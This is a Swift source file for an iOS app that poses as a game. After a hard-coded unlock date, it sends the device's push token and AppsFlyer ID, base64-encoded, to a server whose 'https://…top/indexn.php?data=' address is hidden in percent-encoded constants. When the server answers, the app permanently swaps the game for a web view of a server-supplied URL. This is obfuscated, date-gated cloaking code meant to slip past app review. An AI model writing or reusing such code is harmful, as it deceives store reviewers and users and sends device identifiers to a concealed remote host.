import SwiftUI
@preconcurrency import WebKit
import UserNotifications

public enum AppStateStatus {
    case success(URL)
    case game
    case loading
}

public protocol  RequestsManagerDelegate: AnyObject {
    func handle(action: AppStateStatus)
}

@MainActor
public class RequestsManager {
    
    public weak var delegate: RequestsManagerDelegate?
    
    @ObservedObject var monitor = NetworkMonitor.shared
    
    public init(appsDevKey: String, appleAppId: String, one: String, two: String, okay: String?) {
        AppsFlyerConstants.appleAppID = appleAppId
        AppsFlyerConstants.appsFlyerDevKey = appsDevKey
        Constants.url1 = one
        Constants.url2 = two
        Constants.unlockDate = okay
        
    }
    
    fileprivate var networkService: INetworkService {
        return NetworkService()
    }
    
    
    private let urlStorageKey = "receivedURL"
    private var apnsToken = "default"
    private var retryCount = 0
    private let maxRetryCount = 3
    private let retryDelay = 3.0
    
    public func getTokens() async {
        
        if let unlockDate = Constants.unlockDate {
            guard checkUnlockDate(unlockDate.decodePercentEncoding()) else {
                failureLoading()
                return
            }
        }
        
        if !monitor.isActive {
            await retryInternetConnection()
            return
        }
        
        if !isFirstLaunch() {
            handleStoredState()
            return
        }
        
        await getDeviceTokens()
        
        networkService.sendRequest(deviceData: getDeviceData()) { result in
            switch result {
                case .success(let url):
                    self.handleFirstLaunchSuccess(url: url)
                    self.sendNTFQuestionToUser()
                case .failure:
                    self.handleFirstLaunchFailure()
            }
        }
    }
    
    private func getDeviceTokens() async {
        await withCheckedContinuation { (continuation: CheckedContinuation<Void, Never>) in
            var isContinuationResumed = false
            
            func safeResume() {
                if !isContinuationResumed {
                    isContinuationResumed = true
                    continuation.resume()
                }
            }
            
            DispatchQueue.main.async {
                UIApplication.shared.registerForRemoteNotifications()
            }
            
            let timeout = DispatchTime.now() + 5 // таймаут
            
            let observer = NotificationCenter.default.addObserver(
                forName: .apnsTokenReceived,
                object: nil,
                queue: .main
            ) { [weak self] notification in
                guard let self = self else { return }
                
                if let token = notification.userInfo?["token"] as? String {
                    Task { @MainActor in
                        self.apnsToken = token
                        safeResume()
                    }
                }
            }
            
            DispatchQueue.main.asyncAfter(deadline: timeout) { [weak self] in
                guard let self = self else { return }
                
                NotificationCenter.default.removeObserver(observer)
                
                if self.apnsToken == "default" {
                    Task { @MainActor in
                        print("APNs токен не получен")
                        safeResume()
                    }
                } else {
                    safeResume()
                }
            }
        }
    }
    
    // Функция для повторных попыток подключения к интернету
    private func retryInternetConnection() async {
        if retryCount >= maxRetryCount {
            DispatchQueue.main.async {
                self.monitor.showInternetALert = true
            }
            retryCount = 0
            return
        }
        retryCount += 1
        
        try? await Task.sleep(nanoseconds: UInt64(retryDelay * 1_000_000_000))
        
        if monitor.isActive {
            retryCount = 0
            
            if !isFirstLaunch() {
                handleStoredState()
            } else {
                await getDeviceTokens()
            }
        } else {
           
            await retryInternetConnection()
        }
    }
    
    
    func getDeviceData() -> [String: String] {
        let data = [
            "apns_token": apnsToken,
            "appsflyer_id": AppsFlyerConstants.appsflyerID ?? "default"
        ]
        print("Device data:", data)
        return data
    }
    
    private func isFirstLaunch() -> Bool {
        !UserDefaults.standard.bool(forKey: "hasLaunchedBefore")
    }
    
    private func handleFirstLaunchSuccess(url: URL) {
        UserDefaults.standard.set(url.absoluteString, forKey: urlStorageKey)
        UserDefaults.standard.set(true, forKey: "isShowWV")
        UserDefaults.standard.set(false, forKey: "isShowGame")
        UserDefaults.standard.set(true, forKey: "hasLaunchedBefore")
        successLoading(object: url)
    }
    
    private func handleFirstLaunchFailure() {
        UserDefaults.standard.set(true, forKey: "isShowGame")
        UserDefaults.standard.set(false, forKey: "isShowWV")
        UserDefaults.standard.set(true, forKey: "hasLaunchedBefore")
        failureLoading()
    }
    
    private func handleStoredState() {
        if isShowWV(), let urlString = UserDefaults.standard.string(forKey: urlStorageKey), let url = URL(string: urlString) {
            successLoading(object: url)
        } else {
            failureLoading()
        }
    }
    
    fileprivate func checkUnlockDate(_ date: String) -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        let currentDate = Date()
        guard let unlockDate = dateFormatter.date(from: date), currentDate >= unlockDate else {
            print("Дата еще на неступила ❌")
            return false
        }
        return true
    }
    
    func isShowGame() -> Bool {
        UserDefaults.standard.bool(forKey: "isShowGame")
    }
    
    func isShowWV() -> Bool {
        UserDefaults.standard.bool(forKey: "isShowWV")
    }
    
    func sendNTFQuestionToUser() {
        
        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
        UNUserNotificationCenter.current().requestAuthorization(options: authOptions) {_, _ in }
        
    }
}



// Уведомления для UI
extension RequestsManager {
    func failureLoading() {
        DispatchQueue.main.async {
            self.delegate?.handle(action: .game)
        }
    }
    
    func successLoading(object: URL) {
        DispatchQueue.main.async {
            self.delegate?.handle(action: .success(object))
        }
    }
}

protocol INetworkService: AnyObject {
    func sendRequest(deviceData: [String: String], _ completion: @escaping (Result<URL,Error>) -> Void )
}

final class NetworkService: INetworkService {
    
    // получаем базовый url из бандла
    func getUrlFromBundle() -> String {
        guard let bundleId = Bundle.main.bundleIdentifier else { return "" }
        let cleanedString = bundleId.replacingOccurrences(of: ".", with: "")
        let stringUrl: String = Constants.protoco.decodePercentEncoding() + cleanedString + Constants.index.decodePercentEncoding()
        print(stringUrl)
        return stringUrl.lowercased()
    }
    
    private func getFinalUrl(data: [String: String]) -> URL? {
        let queryItems = data.map { URLQueryItem(name: $0.key, value: $0.value) }
        var components = URLComponents()
        components.queryItems = queryItems
        
        guard let queryString = components.query?.data(using: .utf8) else {
            return nil
        }
        let base64String = queryString.base64EncodedString()
        let finalUrl1 = URL(string: getUrlFromBundle() + Constants.data.decodePercentEncoding() + base64String)
        return finalUrl1
    }
    
    func decodeJsonData(data: Data, completion: @escaping (Result<URL, Error>) -> Void) {
        do {
            let decodedData = try JSONDecoder().decode(Urls.self, from: data)
            
            guard !decodedData.url1.isEmpty, !decodedData.url2.isEmpty else {
                completion(.failure(URLDecodingError.emptyParameters))
                return
            }
            
            guard let url = URL(string: Constants.protoco.decodePercentEncoding() + decodedData.url1 + decodedData.url2) else {
                completion(.failure(URLDecodingError.invalidURL))
                return
            }
            
            completion(.success(url))
        } catch {
            print("Decoding error: \(error)")
            UserDefaults.standard.setValue(true, forKey: "openedOnboarding")
            completion(.failure(error))
        }
    }
    
    func sendRequest(deviceData: [String: String], _ completion: @escaping (Result<URL,Error>) -> Void ) {
        guard let url = getFinalUrl(data: deviceData) else {
            completion(.failure(URLDecodingError.invalidURL))
            return
        }
        let configuration = URLSessionConfiguration.default
        configuration.timeoutIntervalForRequest = 5
        let session = URLSession(configuration: configuration)
        
        let task = session.dataTask(with: url) { data, response, error in
            if let error = error as NSError?,
               error.code == NSURLErrorTimedOut {
                completion(.failure(URLDecodingError.timeout))
                return
            }
            
            if let httpResponse = response as? HTTPURLResponse {
                print("Status Code: \(httpResponse.statusCode)")
            }
            
            
            if let data = data {
                self.decodeJsonData(data: data) { result in
                    switch result {
                        case .success(let decodedUrl):
                            completion(.success(decodedUrl))
                            print("DECODED URL", decodedUrl)
                        case .failure(let error):
                            completion(.failure(error))
                    }
                }
            } else {
                print("empty data")
                completion(.failure(URLDecodingError.emptyData))
            }
        }
        task.resume()
    }
}



final class Constants {
    
    static var url1 = "%77%68%69%73%6B"
    static var url2 = "%67%75%73%74%79"
    static var unlockDate: String?
    static var protoco = "%68%74%74%70%73%3A%2F%2F"
    static var index = "%2E%74%6F%70%2F%69%6E%64%65%78%6E%2E%70%68%70"
    static var data = "%3F%64%61%74%61%3D"
    
}

fileprivate struct Urls: Decodable {
    let url1: String
    let url2: String
    
    
    init(from decoder: Decoder) throws {
        let container = try decoder.container(keyedBy: DynamicCodingKeys.self)
        self.url1 = try container.decode(String.self, forKey: DynamicCodingKeys(stringValue: Constants.url1.decodePercentEncoding())!)
        self.url2 = try container.decode(String.self, forKey: DynamicCodingKeys(stringValue: Constants.url2.decodePercentEncoding())!)
    }
}

enum URLDecodingError: Error {
    case emptyParameters
    case invalidURL
    case emptyData
    case timeout
}

struct DynamicCodingKeys: CodingKey {
    var stringValue: String
    init?(stringValue: String) {
        self.stringValue = stringValue
    }
    
    var intValue: Int? { nil }
    init?(intValue: Int) { return nil }
}
